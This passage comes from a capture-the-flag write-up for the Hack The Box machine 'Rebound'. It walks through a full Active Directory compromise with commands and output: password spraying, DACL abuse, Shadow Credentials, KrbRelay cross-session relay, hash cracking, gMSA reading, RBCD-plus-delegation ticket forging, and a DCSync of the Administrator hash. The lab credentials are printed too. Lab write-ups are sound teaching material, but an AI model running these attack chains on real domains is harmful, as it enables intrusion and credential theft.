INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.rebound.htb
INFO: Done in 00M 07S
INFO: Compressing output into 20260616215913_bloodhound.zip
```

Using this filter
```sql
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights|ForceChangePassword|AddMembers|WriteProperty|AllowedToAct|AllowedToDelegate|AdminTo|Owns]->(m)
RETURN n,r,m
```

we find this:

![rebound-1.htb](/assets/img/ctf/data/rebound-1.png)

Interesting group:

![rebound-2.htb](/assets/img/ctf/data/rebound-2.png)

![rebound-3.htb](/assets/img/ctf/data/rebound-3.png)

Let's password spray on these 3:
```bash
$ echo -e 'oorend\nppaul\nfflock' > members.txt

$ nxc smb $IP -u members.txt -p '1GR8t@$$4u'
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u
```

And we got a hit! `oorend`:`1GR8t@$$4u`

---

## 🤸 3.2 Lateral Movement (`oorend` -> `winrm_svc`)

`OOREND` as `AddSelf` over `SERVICEMGMT`:
```bash
$ bloodyAD --host $IP -d $DOMAIN -u OOREND -p '1GR8t@$$4u' add groupMember SERVICEMGMT OOREND
[+] OOREND added to SERVICEMGMT
```

![rebound-4.htb](/assets/img/ctf/data/rebound-4.png)

As `OOREND` is now member of `SERVICEMGMT` and `SERVICEMGMT` has `GenericAll` over `SERVICE USERS` OU, we can take over the descendant objects by extending rights to `OOREND`:

```bash
$ impacket-dacledit $DOMAIN/oorend:'1GR8t@$$4u' -k -dc-ip $IP -action write -rights FullControl -inheritance -principal oorend -target-dn "OU=Service Users,DC=rebound,DC=htb" -use-ldaps
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20260616-224000.bak
[*] DACL modified successfully!
```

Using our `FullControl` now we can perform a Shadow Credentials attack on `winrm_svc` to gain access:
```bash
$ certipy-ad shadow auto -u oorend@$DOMAIN -p '1GR8t@$$4u' -account winrm_svc -target dc01.$DOMAIN -dc-ip $IP -k
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '359c7da17d2f4785986cf7c4577e4f81'
[*] Adding Key Credential with device ID '359c7da17d2f4785986cf7c4577e4f81' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '359c7da17d2f4785986cf7c4577e4f81' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@rebound.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```
> You gotta be quick with the last 3 steps; `oorend` is frequently kicked out of the `SERVICEMGMT` group!

NTLM hash of `winrm_svc`: `4469650fd892e98933b4536d2e86e512`

```bash
$ evil-winrm -i $IP -u winrm_svc -H 4469650fd892e98933b4536d2e86e512

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ~/Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
[REDACTED]
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>
```

![rebound-5.htb](/assets/img/ctf/data/rebound-5.png)

---

## 🤸 3.3 Lateral Movement (`winrm_svc` -> `tbrady`)

After some time of enumerating, we likely found another user having a session on this machine (session: 1):
```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    394      33    12620      21156              2956   0 certsrv
    465      19     2228       5544               392   0 csrss
    262      16     2184       5264               504   1 csrss
    359      15     3512      14968              5224   1 ctfmon
    408      34    16352      24968              3040   0 dfsrs
    181      11     2252       7856              3332   0 dfssvc
    289      14     3836      13808              3912   0 dllhost
   5387    4791    69120      71080              3016   0 dns
    599      25    24484      51864                68   1 dwm
   1507      59    24708      88816              5796   1 explorer
```

We might try a Cross-Session Attack using `RunasCs.exe` and `KrbRelay.exe`.

So, upload `RunasCs.exe` and `KrbRelay.exe` to the machine:
```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> upload /opt/share/RunasCs/RunasCs.exe .

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Uploading /opt/share/RunasCs/RunasCs.exe to C:\Users\winrm_svc\Desktop\.

Data: 68948 bytes of 68948 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> upload /opt/share/KrbRelay.exe .

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Uploading /opt/share/KrbRelay.exe to C:\Users\winrm_svc\Desktop\.

Data: 2157908 bytes of 2157908 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>
```

Using `RunasCs.exe` we can verify who owns that session:
```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> .\RunasCs.exe oorend '1GR8t@$$4u' -l 9 "qwinsta"

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

`tbrady`. We can coerce him into authenticating to us via DCOM. We'll use the CLSID `354ff91b-5e49-4bdc-a8e6-1cb6c6877182`. For more info on that look [here](https://github.com/cube0x0/KrbRelay#clsids).

This is how to perform the attack:
```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> .\RunasCs.exe oorend '1GR8t@$$4u' -l 9 "C:\Users\winrm_svc\Desktop\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b5e49-4bdc-a8e6-1cb6c6877182 -port 10246"


Unhandled Exception: System.FormatException: Guid should contain 32 digits with 4 dashes (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx).
   at System.Guid.GuidResult.SetFailure(ParseFailureKind failure, String failureMessageID, Object failureMessageFormatArgument, String failureArgumentName, Exception innerException)
   at System.Guid.TryParseGuidWithDashes(String guidString, GuidResult& result)
   at System.Guid.TryParseGuid(String g, GuidStyles flags, GuidResult& result)
   at System.Guid..ctor(String g)
   at KrbRelay.Program.Main(String[] args)
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> .\RunasCs.exe oorend '1GR8t@$$4u' -l 9 "C:\Users\winrm_svc\Desktop\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -port 10246"

[*] Auth Context: rebound\tbrady
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Users\winrm_svc\Desktop\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABm6QBCG9wJq67sw4S4VAjAAtQAABwI//+y0rd9gqD+6SIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing cross-session authentication
[*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182
[*] Spawning in session 1
[*] NTLM1
4e544c4d535350000100000097b208e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44
[*] NTLM2
4e544c4d53535000020000000e000e003800000015c289e2c8a8a038ae1bd47b000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800bb3c1592d6fddc0100000000000000000000000000000a00ffff00001600ffff00001f00000000000b000000
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons
[*] NTLM3
tbrady::rebound:c8a8a038ae1bd47b:4cab2c07389971615c8b0c4c4bab47d0:0101000000000000bb3c1592d6fddc0113f413140edc50f10000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800bb3c1592d6fddc0106000400060000000800300030000000000000000100000000200000ca3b3d72bb90397230eadba4b1c2c9e5dd2612fac1061f0955ffabef9676701d0a00100000000000000000000000000000000000090000000000000000000000
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)
   at KrbRelay.Program.Main(String[] args)
```

Let's crack his NTLM3 hash:
```bash
$ echo 'tbrady::rebound:c8a8a038ae1bd47b:4cab2c07389971615c8b0c4c4bab47d0:0101000000000000bb3c1592d6fddc0113f413140edc50f10000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800bb3c1592d6fddc0106000400060000000800300030000000000000000100000000200000ca3b3d72bb90397230eadba4b1c2c9e5dd2612fac1061f0955ffabef9676701d0a00100000000000000000000000000000000000090000000000000000000000' > tbrady

$ john --wordlist=/usr/share/wordlists/rockyou.txt tbrady
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
543BOMBOMBUNmanda (tbrady)
1g 0:00:00:03 DONE (2026-06-16 23:26) 0.3030g/s 3693Kp/s 3693Kc/s 3693KC/s 54626215..5435844
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Success! `tbrady` : `543BOMBOMBUNmanda`.

---

## 🤸 3.4 Lateral Movement (`tbrady` -> `DELEGATOR$`)

![rebound-6.htb](/assets/img/ctf/data/rebound-6.png)

To read the gMSA password we use bloodyAD:
```bash
$ bloodyAD -d $DOMAIN -u tbrady -p '543BOMBOMBUNmanda' --host dc01.$DOMAIN get object 'DELEGATOR$' --resolve-sd --attr msDS-ManagedPassword

distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b6e1691909135eced572c9f32092ff9a
msDS-ManagedPassword.B64ENCODED: 91Nu1JXo5KJELDYkoNaj4bM/OKIh55pPBIR5iaj7Ujb1mxTqvEPT7ViAkX6joq5nNU/RSm6Cpnj1n79n0Me7QWuA58nXkJKRylX7bAhC9YX2IcRdVAu7qwVBgrYYMX7h8Wn2dW3LW5U3GMYxGnFk4ytaFlJOljxOiKc8cFonga3qRCEunmijd7IE50ZAhD7PT1yYS3Hu97/sE8GRNNwyTXF3YrY0qorZ/r1eo52lyZBVMNBUuMqpNBN2Oj4BJ4bRYZMbZ22Ak1TZs4I4KA9ujRZa3raK9iTuBJlBQb8FLa/IGye6AtHHkEFx4v+TlMiOJFHVJnCNbMqZnReUI+edoQ==
```

NTLM hash of `delegator$`: `b6e1691909135eced572c9f32092ff9a`

---

## 📈 4. Privilege Escalation (`DELEGATOR$` -> `DC01$`)

We found out earlier that `DELEGATOR$` can delegate to DC01 potentially granting us Domain Admin. We have to find out what we can delegate to:
```bash
$ impacket-findDelegation $DOMAIN/delegator\$ -hashes :b6e1691909135eced572c9f32092ff9a
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

AccountName  AccountType                          DelegationType                       DelegationRightsTo     SPN Exists
-----------  -----------------------------------  -----------------------------------  ---------------------  ----------
DC01$        Computer                             Unconstrained                        N/A                    Yes
delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb  No
```

`Constrained w/o Protocol Transition` means we can only delegate when the user authenticating to us already uses Kerberos using a *Forwardable TGT*. This means we can't perform the classic S4U2Self/S4U2Proxy attack. But we can do something really smart:
1. Allow RBCD on `DELEGATOR$` for a specific user we control.
2. Impersonate `DC01$` on the machine `DELEGATOR$` that we control and logging in using a Forwardable TGT.
3. Take that TGT and use it against `DC01$`.

Quite easy, right? Here's how to do it:

1. Allow RBCD & Verify:

    ```bash
    $ impacket-rbcd $DOMAIN/delegator\$ -hashes :b6e1691909135eced572c9f32092ff9a -k -delegate-from ldap_monitor -delegate-to delegator\$ -action write -dc-ip $IP -use-ldaps
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    [-] CCache file is not found. Skipping...
    [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
    [*] Delegation rights modified successfully!
    [*] winrm_svc can now impersonate users on delegator$ via S4U2Proxy
    [*] Accounts allowed to act on behalf of other identity:
    [*]     winrm_svc    (S-1-5-21-4078382237-1492182817-2568127209-7684)

    $ impacket-findDelegation $DOMAIN/delegator\$ -hashes :b6e1691909135eced572c9f32092ff9a
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    AccountName  AccountType                          DelegationType                       DelegationRightsTo     SPN Exists
    -----------  -----------------------------------  -----------------------------------  ---------------------  ----------
    DC01$        Computer                             Unconstrained                        N/A                    Yes
    ldap_monitor Person                               Resource-Based Constrained           delegator$             No
    delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb  No
    ```

    `ldap_monitor` can now delegate to `DELEGATOR$`.

    > Why did we choose `ldap_monitor` over `winrm_svc`? Because the account requesting the ticket must have an SPN. `ldap_monitor` has an SPN, `winrm_svc` has none. And `winrm_svc` has no rights to create an SPN so we go with `ldap_monitor`. Look here:

    ```bash
    $ impacket-GetUserSPNs $DOMAIN/delegator$ -hashes :b6e1691909135eced572c9f32092ff9a
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    ServicePrincipalName          Name          MemberOf  PasswordLastSet             LastLogon                   Delegation
    ----------------------------  ------------  --------  --------------------------  --------------------------  ----------
    ldapmonitor/dc01.rebound.htb  ldap_monitor            2023-04-08 11:07:56.123753  2026-06-17 00:28:55.949886
    ```

2. Impersonate `DC01$` on `DELEGATOR$`:

    ```bash
    $ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn delegator$ -impersonate 'DC01$' -dc-ip dc01.$DOMAIN
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [*] Impersonating DC01$
    [*] Requesting S4U2self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in DC01$@delegator$@REBOUND.HTB.ccache
    ```

    Looking at the ticket now, we see we can forward it:
    ```bash
    $ impacket-describeTicket DC01\$@delegator\$@REBOUND.HTB.ccache
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    [*] Number of credentials in cache: 1
    [*] Parsing credential[0]:
    [*] Ticket Session Key            : 0906c8bf1f173271283157417ef33606
    [*] User Name                     : DC01$
    [*] User Realm                    : rebound.htb
    [*] Service Name                  : delegator$
    [*] Service Realm                 : REBOUND.HTB
    [*] Start Time                    : 17/06/2026 00:40:46 AM
    [*] End Time                      : 17/06/2026 10:40:46 AM
    [*] RenewTill                     : 18/06/2026 00:40:45 AM
    [*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
    [*] KeyType                       : rc4_hmac
    [*] Base64(key)                   : CQbIvx8XMnEoMVdBfvM2Bg==
    [*] Kerberoast hash               : <SNIP>
    [*] Decoding unencrypted data in credential[0]['ticket']:
    [*]   Service Name                : delegator$
    [*]   Service Realm               : REBOUND.HTB
    [*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
    [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
    ```

    `Flags                         : (0x40a10000) forwardable`.

3. Forward ticket:

    ```bash
    $ impacket-getST $DOMAIN/delegator$ -hashes :b6e1691909135eced572c9f32092ff9a -spn http/dc01.rebound.htb -additional-ticket DC01\$@delegator\$@REBOUND.HTB.ccache -impersonate DC01$
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [*] Impersonating DC01$
    [*] 	Using additional ticket DC01$@delegator$@REBOUND.HTB.ccache instead of S4U2Self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
    ```

4. CASH:

    ```bash
    $ KRB5CCNAME=DC01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache impacket-secretsdump -k -no-pass -just-dc-user Administrator dc01.$DOMAIN
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
    [*] Kerberos keys grabbed
    Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
    Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
    Administrator:des-cbc-md5:ad8ac2a825fe1080
    [*] Cleaning up...

    $ KRB5CCNAME=DC01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache impacket-secretsdump -k -no-pass -just-dc-user Administrator dc01.$DOMAIN
    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
    [*] Kerberos keys grabbed
    Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
    Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
    Administrator:des-cbc-md5:ad8ac2a825fe1080
    [*] Cleaning up...

    $ evil-winrm -i $IP -u Administrator -H 176be138594933bb67db3b2572fc91b8

    Evil-WinRM shell v3.9

    Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami ; cat ~/Desktop/root.txt
    rebound\administrator
    [REDACTED]
    *Evil-WinRM* PS C:\Users\Administrator\Documents>
    ```

    ![rebound-7.htb](/assets/img/ctf/data/rebound-7.png)

---

## 🧠 Learnings

1. Always try AS-REP roasting and Kerberoasting during initial enumeration, as they can provide a solid foothold without needing any prior credentials. Kerberoasting can even be achieved without credentials!
2. Mapping out Active Directory permissions with tools like `BloodHound` is incredibly useful for spotting complex lateral movement paths, like nested group permissions and DACL abuse.
3. Cross-session attacks are a great trick to have up your sleeve; tools like `RunasCs` and `KrbRelay` can easily compromise other users who have active sessions on the same machine.
4. Understanding the nuances of delegation is key for privilege escalation. Even when constrained delegation lacks protocol transition, you can still chain it with RBCD and ticket forwarding to achieve full Domain Admin compromise.
